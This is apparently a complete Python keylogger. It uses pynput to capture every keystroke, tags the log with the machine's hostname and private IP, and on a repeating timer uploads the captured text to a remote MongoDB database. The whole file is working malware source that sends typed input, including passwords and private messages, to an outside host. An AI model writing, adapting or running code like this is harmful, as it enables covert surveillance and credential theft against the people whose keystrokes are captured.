import Constants, pynput, datetime, os, threading, socket

from pynput.keyboard import Key, Listener
from pymongo import MongoClient


start_time = datetime.datetime.now().strftime(Constants.time_format_setting)

uri = os.environ.get(Constants.connection_string)

keys_typed = ""
log = ""

try:
	client = MongoClient(uri,
    	connectTimeoutMS=30000,
        socketTimeoutMS=None)
except:
	 print("Connection unsuccessful")

db = client[Constants.database]
keys = db[Constants.collection]

def set_time_to_store_data(function_to_execute, seconds_till_timout):
    def function_wrapper():
        set_time_to_store_data(function_to_execute, seconds_till_timout)
        function_to_execute()

    timer = threading.Timer(seconds_till_timout, function_wrapper)
    timer.start()

    return timer

def store_in_database() :
	complete_log()

	try:
		keys.insert_one({ Constants.log_title : log })
		reset_log()
	except:
		 print("Something went wrong")

def complete_log() :
	global log 
	global keys_typed

	log += keys_typed

def reset_log() :
	global log
	global keys_typed

	log = ""
	keys_typed = ""

def writeText(host_name, host_ip) :
    global log
    log += ("Start Time " + start_time + "\n")
    log += ("Hostname: " + host_name + "\n")
    log += ("Private IP: " + host_ip + "\n")

def get_host_name_IP(): 
    try: 
        host_name = socket.gethostname() 
        host_ip = socket.gethostbyname(host_name)
       
        writeText(host_name, host_ip)
    except: 
        writeText(host_name, host_ip)

def start_logging():
	get_host_name_IP()
	timer = set_time_to_store_data(store_in_database, Constants.time_before_store)

start_logging()

def on_key_press(key) :
	global keys_typed

	keyString = str(key).replace("'","")

	if(keyString == Constants.recorded_space):
		keys_typed += " "
	elif(keyString == Constants.recorded_shift):
		pass
	else:
		keys_typed += keyString

def on_key_release(key) :
	pass

with Listener(on_press=on_key_press, on_release=on_key_release) as keyListener :
	keyListener.join()